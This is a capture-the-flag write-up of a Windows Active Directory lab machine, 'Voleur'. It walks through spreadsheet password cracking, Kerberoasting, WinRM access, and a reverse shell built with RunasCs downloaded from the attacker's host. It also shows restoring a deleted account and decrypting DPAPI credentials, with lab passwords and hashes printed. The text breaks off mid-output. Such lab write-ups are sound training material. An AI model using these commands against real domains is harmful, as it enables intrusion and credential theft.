# Voleur

## Recon

> As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor / HollowOct31Nyt`

::: details nmap_scan.log
```log
Open 10.10.11.76:53
Open 10.10.11.76:88
Open 10.10.11.76:135
Open 10.10.11.76:139
Open 10.10.11.76:389
Open 10.10.11.76:445
Open 10.10.11.76:464
Open 10.10.11.76:593
Open 10.10.11.76:2222
Open 10.10.11.76:3268
Open 10.10.11.76:3269
Open 10.10.11.76:5985
Open 10.10.11.76:9389
Open 10.10.11.76:49664
Open 10.10.11.76:49668
Open 10.10.11.76:55956
Open 10.10.11.76:56481
Open 10.10.11.76:55927
Open 10.10.11.76:55929
Open 10.10.11.76:55928
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.76

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-25 13:42:08Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
2222/tcp  open  ssh           syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=
|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
55927/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
55928/tcp open  msrpc         syn-ack Microsoft Windows RPC
55929/tcp open  msrpc         syn-ack Microsoft Windows RPC
55956/tcp open  msrpc         syn-ack Microsoft Windows RPC
56481/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-25T13:43:00
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48495/tcp): CLEAN (Timeout)
|   Check 2 (port 16698/tcp): CLEAN (Timeout)
|   Check 3 (port 60782/udp): CLEAN (Timeout)
|   Check 4 (port 24333/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h59m58s
```
:::

## DNS

```bash
└─$ dig ANY voleur.htb @10.10.11.76 | grep -vE ';|^$'
voleur.htb.             600     IN      A       10.10.11.76
voleur.htb.             3600    IN      NS      dc.voleur.htb.
voleur.htb.             3600    IN      SOA     dc.voleur.htb. hostmaster.voleur.htb. 160 900 600 86400 3600
dc.voleur.htb.          3600    IN      A       10.10.11.76

└─$ dnsrecon -d voleur.htb -n 10.10.11.76 --tcp
[*] std: Performing General Enumeration against: voleur.htb...
[-] DNSSEC is not configured for voleur.htb
[*]      SOA dc.voleur.htb 10.10.11.76
[*]      NS dc.voleur.htb 10.10.11.76
[*]      A voleur.htb 10.10.11.76
[*] Enumerating SRV Records
[+]      SRV _ldap._tcp.voleur.htb dc.voleur.htb 10.10.11.76 389
[+]      SRV _gc._tcp.voleur.htb dc.voleur.htb 10.10.11.76 3268
[+]      SRV _kerberos._udp.voleur.htb dc.voleur.htb 10.10.11.76 88
[+]      SRV _kerberos._tcp.voleur.htb dc.voleur.htb 10.10.11.76 88
[+]      SRV _ldap._tcp.ForestDNSZones.voleur.htb dc.voleur.htb 10.10.11.76 389
[+]      SRV _ldap._tcp.dc._msdcs.voleur.htb dc.voleur.htb 10.10.11.76 389
[+]      SRV _ldap._tcp.pdc._msdcs.voleur.htb dc.voleur.htb 10.10.11.76 389
[+]      SRV _ldap._tcp.gc._msdcs.voleur.htb dc.voleur.htb 10.10.11.76 3268
[+]      SRV _kpasswd._tcp.voleur.htb dc.voleur.htb 10.10.11.76 464
[+]      SRV _kerberos._tcp.dc._msdcs.voleur.htb dc.voleur.htb 10.10.11.76 88
[+]      SRV _kpasswd._udp.voleur.htb dc.voleur.htb 10.10.11.76 464
[+] 11 Records Found
```

## General Enum

```bash
└─$ py /media/sf_VBoxShare/Cicada-Mastertul/cicada-mastertul.py  -u 'ryan.naylor' -p 'HollowOct31Nyt' -t 10.10.11.76 -d dc.voleur.htb -k --full
Target IP: 10.10.11.76
Domain: dc.voleur.htb
Username: ryan.naylor
Password: HollowOct31Nyt
Kerberos Authentication Enabled

Full Mode Enabled
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[!] Enumerating SMB...
[~] Command: faketime -f +8h netexec smb dc.voleur.htb --timeout 99 -u 'ryan.naylor' -p 'HollowOct31Nyt' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_FILTER='NETLOGON,SYSVOL,IPC$,C$,ADMIN$' OUTPUT_FOLDER=/home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/smb_results -k
[+] SMB share drive names saved to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/smb_results/share_names.txt
[+] SMB share drives list saved to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/smb_results/share_drives.txt
[*] Downloading SMB share files to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/smb_results
[!] Connecting to WinRM...
[~] Command: faketime -f +8h netexec winrm dc.voleur.htb --timeout 99 -u 'ryan.naylor' -p 'HollowOct31Nyt'  -k
[-] Could not connect to WinRM
[!] Enumerating users with netexec rib bruteforce (up to 5000)...
[~] Command: faketime -f +8h netexec smb dc.voleur.htb --timeout 99 -u 'ryan.naylor' -p 'HollowOct31Nyt' --rid-brute 5000 -k
[+] Lookupsids saved to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/lookupsid_results/lookupsid.txt
[+] Users list saved to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/lookupsid_results/users.txt
[!] Enumerating NPUsers using impacket...
[~] Command: faketime -f +8h impacket-GetNPUsers 'voleur.htb'/'ryan.naylor':'HollowOct31Nyt'@'10.10.11.76'  -usersfile /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/lookupsid_results/users.txt
[-] No NPUsers found, saved output to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/kerberos_results/GetNPUsers_results.txt
[!] Enumerating UserSPNs using impacket...
[~] Command: faketime -f +8h impacket-GetUserSPNs 'voleur.htb'/'ryan.naylor':'HollowOct31Nyt'@'10.10.11.76'  -request -dc-host dc.voleur.htb -k
[-] No UserSPNs found, saved output to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/kerberos_results/GetUserSPNs_results.txt
[!] Collecting Bloodhound Files...
[~] Command: faketime -f +8h bloodhound-python -d voleur.htb -u 'ryan.naylor' -ns 10.10.11.76 -c all --dns-timeout 100 --zip -op ryan.naylor -p 'HollowOct31Nyt'
[+] Bloodhound saved to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/bloodhound_results
[!] Enumerating LDAP...
[~] Command: faketime -f +8h netexec ldap dc.voleur.htb --timeout 99 -u 'ryan.naylor' -p 'HollowOct31Nyt' --query "(objectclass=*)" "" -k
[+] LDAP saved to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/ldap_results/results.txt
[+] LDAP saved to /home/woyag/Desktop/Rooms/Voleur/mastertool/10.10.11.76/ldap_results/results.html
[!x!] Cleaning up...

└─$ tree mastertool
mastertool
└── 10.10.11.76
    ├── bloodhound_results
    │   ├── ryan.naylor_20250726144418_bloodhound.zip
    │   └── ryan.naylor_20250726144614_bloodhound.zip
    ├── kerberos_results
    │   ├── GetNPUsers_results.txt
    │   └── GetUserSPNs_results.txt
    ├── ldap_results
    │   ├── results.html
    │   └── results.txt
    ├── lookupsid_results
    │   ├── lookupsid.txt
    │   └── users.txt
    └── smb_results
        ├── dc.voleur.htb
        │   └── IT
        │       └── First-Line Support
        │           └── Access_Review.xlsx
        ├── dc.voleur.htb.json
        ├── share_drives.txt
        └── share_names.txt
```

## SMB

File on SMB is password protected.
```bash
└─$ open 'mastertool/10.10.11.76/smb_results/dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx'

└─$ office2john 'mastertool/10.10.11.76/smb_results/dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx' | tee access.hash
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c

➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
football1        (Access_Review.xlsx)
```

| **User**       | **Job Title**                  | **Permissions**          | **Notes**                                                             |
| -------------- | ------------------------------ | ------------------------ | --------------------------------------------------------------------- |
| Ryan.Naylor    | First-Line Support Technician  | SMB                      | Has Kerberos Pre-Auth disabled temporarily to test legacy systems.    |
| Marie.Bryant   | First-Line Support Technician  | SMB                      |                                                                       |
| Lacey.Miller   | Second-Line Support Technician | Remote Management Users  |                                                                       |
| ~~Todd.Wolfe~~ | Second-Line Support Technician | Remote Management Users  | Leaver. Password was reset to NightT1meP1dg3on14 and account deleted. |
| Jeremy.Combs   | Third-Line Support Technician  | Remote Management Users. | Has access to Software folder.                                        |
| Administrator  | Administrator                  | Domain Admin             | Not to be used for daily tasks!                                       |

| **Service Accounts** | **Job Title** | **Permissions**    | **Notes**                                     |
| -------------------- | ------------- | ------------------ | --------------------------------------------- |
| svc_backup           |               | Windows Backup     | Speak to Jeremy!                              |
| svc_ldap             |               | LDAP Services      | P/W - M1XyC9pW7qT5Vn                          |
| svc_iis              |               | IIS Administration | P/W - N5pXyW1VqM7CZ8                          |
| svc_winrm            |               | Remote Management  | Need to ask Lacey as she reset this recently. |

![Writeup.png](/assets/pentest/htb/voleur/Writeup.png)

### GenericWrite (lacey.miller)

Lacey did something to WinRM user so let's first target her.

![Writeup-1.png](/assets/pentest/htb/voleur/Writeup-1.png)

**Shadow Credentials** attack fails because **the KDC (domain controller) does NOT support PKINIT** (the certificate-based pre-authentication data type).
```bash
└─$ faketime -f +8h certipy-ad shadow auto -u 'svc_ldap@voleur.htb' -p 'M1XyC9pW7qT5Vn' -account 'lacey.miller' -target 'dc.voleur.htb' -dc-ip '10.10.11.76' -ldap-scheme ldap -k -dc-host 'dc.voleur.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'lacey.miller'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '15be1b46-2886-9eb9-c068-2849aad355bb'
[*] Adding Key Credential with device ID '15be1b46-2886-9eb9-c068-2849aad355bb' to the Key Credentials for 'lacey.miller'
[*] Successfully added Key Credential with device ID '15be1b46-2886-9eb9-c068-2849aad355bb' to the Key Credentials for 'lacey.miller'
[*] Authenticating as 'lacey.miller' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'lacey.miller@voleur.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
[*] Restoring the old Key Credentials for 'lacey.miller'
[*] Successfully restored the old Key Credentials for 'lacey.miller'
[*] NT hash for 'lacey.miller': None
```

### WriteSPN

Both accounts are **Kerberoastable** by this user.

```bash
└─$ faketime -f +8h netexec ldap dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k --kerberoasting output.txt
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
LDAP        dc.voleur.htb   389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.voleur.htb   389    DC               [*] Total of records returned 1
LDAP        dc.voleur.htb   389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 04:10:12.398769, lastLogon: 2025-07-26 15:39:52.935655
LDAP        dc.voleur.htb   389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$4415edfebd3d6871e708483e99362493$26a6b1277a4947f32160a0afcea2ff2d065443c0528ccaf5c30280a43d29b69e185c314b914b08228af64063924c7ff89d8f42bfc05a06e0101a967bae1fa10669c5c986dfb481777a9012ade79831919eeabe2f2bd134b4ca9a9fec2a77ac95d421ab1de29422837a22c14e379ef792c99e27c94017afc9a47692d9301db61bfa6d374af2a5aeff69814456e48e2f77fbfdbd68c36c6c790422f8f653e6776efc35aeb608b696768d3126cc0f8255b92b1b6065619da83c8c0a4ffd1b4b77bfa232e1d52225597e3e1d91706eacf23c86f33481b307e55fa5a7827a4c1b004c8073aed729068223753878ac583c61ab9158d0d93843053d28a9218e1d0ad12ee5a883d49c2a950363854e9b996f9d25038a2d85bf7d3aa71b6dcddfadf0b702b296bcf3697528fd67b69fc2c8537cff55030a694044972020c59da674e91551d7963c314f957cdabdfa331cfd9f7888b4bf26274a3ab79d014678feebd380c31363d736596f6b121769ca98876bbca7c147e68d3664a0d29174643ca56b20b566489678c94313b6b68422cd54fd9d2b751f0684ed7985bcc347231c7c95891ea513da8706f95d761802045153352a4e96643d86853a9d6c5c9db1adbfd35050f4b1b9ec6278950782b1afbd880dc4804e201fbd1639157f884680411ee59b905c9c917e30a330279abacef3f65a2fd192dc6950959e13dac07dfecb713dd9b49fddf4642943286ad3b1e99ecd168bd5744078cfbb07502602f79671280c4eefbc8e44c61a03733b55034dbc8dba8babb9064b29df0395893ff13eaba2b215476290ec8ebebce56d12de3c5460e1597075c62738b854b2bfb6172460fc2de020a811a1dbccd351f52fba0b8e4999206a3c5aeafa639c0e4ec95c73653fcf2b7a06379f4770c51b06e72aa800e86cc5d277d4982631533f4f24543bb5713eac69ac469c80acac079c2f93db7eccac502ff36f7071f6d6853063b287d694b4360da0a1e51377aec01639bd8edfdd3753f073e0c9db6c91e770447c00eb1c5ab1d28ba28a01e09a40c610602b9237eea9d668446ef27e488a7d6c41cb94ab447e8cf7d8ad71c387d24d5f682c3fa74f4bfddc967fc3cd6e24d8f9834c393f6cb84d1f7771619f98b9c82d054a785e6abd6fa35ea57d410cfa94278fe340b9d8f3c52db80393876e40e589f36dd0f4692c8ffeaae6459c451c80b83c950b77acdaa6bb63c681959576123e99c1a461b53aca1c8bf0f7128c6bfcf8c4a64ce9c5e6581388bf1de07e602e40b68df6ea419c5f5be0aa019eaf2eb5682fe2bbf00cf4698322d19e6c486ed8d33c9eadb7c5819a069bb2dceac1bfc8264a01a0a00065a60d10b28cbae685aeab21dad7b0aa4735994c0ee9731ef02d348bcd70bfe7d1006290a4f84fd919fc20b27888b4f67bec0c97b9f4061da22734866942fd9edbb2908ebb242aba56c574c3c83f5a51714ae327c5
```

```powershell
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
AFireInsidedeOzarctica980219afi (?)
```

## WinRM

Generate `krb5.conf` for `evil-winrm`
```bash
└─$ sudo netexec smb dc.voleur.htb --generate-krb5-file /etc/krb5.conf
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
```

```bash
└─$ faketime -f +8h impacket-getTGT 'voleur.htb'/'svc_winrm':'AFireInsidedeOzarctica980219afi' -dc-ip 10.10.11.76
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in svc_winrm.ccache

└─$ export KRB5CCNAME=$(readlink -f svc_winrm.ccache)

└─$ faketime -f +8h evil-winrm -i dc.voleur.htb -r voleur.htb
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> whoami /all

User Name        SID
================ ==============================================
voleur\svc_winrm S-1-5-21-3927696377-1337352550-2781715495-1601

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### User.txt

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cat ../Desktop/user.txt
84d68bdc72280e30d15c99e78445bcd9
```

## Privilege Escalation (Todd.Wolfe)

### Deleted Objects

If we search for this user in download objects we don't find it, that's because `svc_winrm` doesn't have enough privileges.
```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Get-ADObject -Filter 'CN -like "Todd*"' -IncludeDeletedObjects -Properties *
```

However `svc_ldap` was part of `Restore_Users` which should have enough privileges to restore that user. 

We can use **[RunasCs](https://github.com/antonioCoco/RunasCs)** to get shell access as `svc_ldap`

```bash
└─$ curl -LOs https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/RunasCs.cs
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> ls /Windows -rec -fil csc.exe -erroraction silent | %{$_.FullName}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15806.0_none_76ec1420387eb344\csc.exe
C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15806.0_none_be994af74cfadc4a\csc.exe

*Evil-WinRM* PS C:\Users\svc_winrm\Music> curl.exe 10.10.14.37/RunasCs.cs -Os
*Evil-WinRM* PS C:\Users\svc_winrm\Music> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1692c2c$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6140 created in background.
```

```bash
└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.76:62094.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami /all
User Name       SID
=============== ==============================================
voleur\svc_ldap S-1-5-21-3927696377-1337352550-2781715495-1106

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
VOLEUR\Restore_Users                       Group            S-1-5-21-3927696377-1337352550-2781715495-1602 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Users\svc_ldap> Get-ADObject -Filter 'CN -like "Todd*"' -IncludeDeletedObjects # -Properties *
Get-ADObject -Filter 'CN -like "Todd*"' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db

PS C:\Users\svc_ldap> Get-ADObject -Filter 'CN -like "Todd*"' -IncludeDeletedObjects | Restore-ADObject
Get-ADObject -Filter 'CN -like "Todd*"' -IncludeDeletedObjects | Restore-ADObject

PS C:\Users\svc_ldap> Get-ADObject -Filter 'CN -like "Todd*"' -IncludeDeletedObjects
Get-ADObject -Filter 'CN -like "Todd*"' -IncludeDeletedObjects

Deleted           :
DistinguishedName : CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
Name              : Todd Wolfe
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db

PS C:\Users\svc_ldap> Get-ADPrincipalGroupMembership todd.wolfe | Select Name

Name
----
Domain Users
Remote Management Users
Second-Line Technicians
```

No luck with winrm, even tho user is part of **Remote Management Users**
```bash
└─$ faketime -f +8h impacket-getTGT 'voleur.htb'/'todd.wolfe':'NightT1meP1dg3on14' -dc-ip 10.10.11.76
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in todd.wolfe.ccache

└─$ export KRB5CCNAME=$(readlink -f todd.wolfe.ccache)

└─$ faketime -f +8h evil-winrm -i dc.voleur.htb -r voleur.htb
Evil-WinRM shell v3.5
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success

Error: Exiting with code 1
malloc(): unaligned fastbin chunk detected
Caught Aborted
```

## Privilege Escalation (Jeremy.Combs)

### DPAPI

The share has bunch of files, interesting files include DPAPI credentials. [https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)
```bash
└─$ faketime -f +8h impacket-getTGT 'voleur.htb'/'todd.wolfe':'NightT1meP1dg3on14' -dc-ip 10.10.11.76
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in todd.wolfe.ccache

└─$ export KRB5CCNAME=$(readlink -f todd.wolfe.ccache)

└─$ faketime -f +8h impacket-smbclient 'voleur.htb'/'todd.wolfe':'NightT1meP1dg3on14'@'dc.voleur.htb' -dc-ip 10.10.11.76 -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Mon Jun 30 17:08:33 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:13:03 2025 Second-Line Support
# tree
...

/Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D
...
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3 # <-
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Crypto/Keys
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Crypto/RSA
...
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/CREDHIST
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/SYNCHIST
...
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Crypto/Keys/de7cf8a7901d2ad13e5c67c29e5d1662_dd91b169-00f0-4f31-9a8e-4df03f609163
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Crypto/RSA/S-1-5-21-3927696377-1337352550-2781715495-1110
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88 # <-
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/BK-VOLEUR
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/Preferred
...
Finished - 1218 files and folders
# get ./Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
# get ./Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
# exit
```

Todd's password works with the masterkey decryption
```bash
└─$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Decrypt the blob
```bash
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
